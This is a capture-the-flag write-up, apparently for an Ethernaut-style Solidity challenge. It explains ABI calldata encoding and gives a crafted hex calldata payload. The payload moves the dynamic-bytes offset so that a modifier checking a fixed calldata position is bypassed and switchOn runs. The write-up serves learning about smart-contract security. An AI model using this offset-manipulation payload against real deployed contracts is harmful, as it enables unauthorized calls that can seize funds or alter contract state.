# Calldata, calldata

As the hint suggests, the trick is to really understand `calldata` encoding, especially when a dynamic datatype is involved.

[This article helped me understand complex calldata encoding](https://r4bbit.substack.com/p/abi-encoding-and-evm-calldata)

# The hack

The `modifier` always assumes that the function selector at the 69-72 bytes will be the `selector` that will be passed in.

```solidity
 modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }
```

But crucially, when encoding a complex datatype, the first 32 byte word after the selector gives an offset, for when to start reading the arguments, so to speak.

If we just pass in the selector for `switchOff` as argument for `flipSwitch()`, using `cast calldata`, we get a vanilla calldata

`cast calldata "flipSwitch(bytes memory)" 0x20606e15`

gives

`0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000`

Which can be divided into

```
0x30c13ade
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000004
20606e1500000000000000000000000000000000000000000000000000000000
```

The first element is the `flipSwitch()` selector, the second is the offset, which basically is asking to start reading after the first 32 byte word, the third is the size and the fourth the actual bytes array.

The important bit is the first 32 byte word: we could change it to shift attention to somewhere else, without changing the `switchOff()` selector's location in the calldata.

So here's the calldata I used:

```
0x30c13ade
0000000000000000000000000000000000000000000000000000000000000060
0000000000000000000000000000000000000000000000000000000000000004
20606e1500000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000004
76227e1200000000000000000000000000000000000000000000000000000000
```

which asks the EVM to look for the arguments after a 0x60 byte offset, skipping the `switchOff()` selector and effectively passing in the `switchOn()` selector.

And in order to pass this in, a new contract was deployed which can call any contract with any calldata.
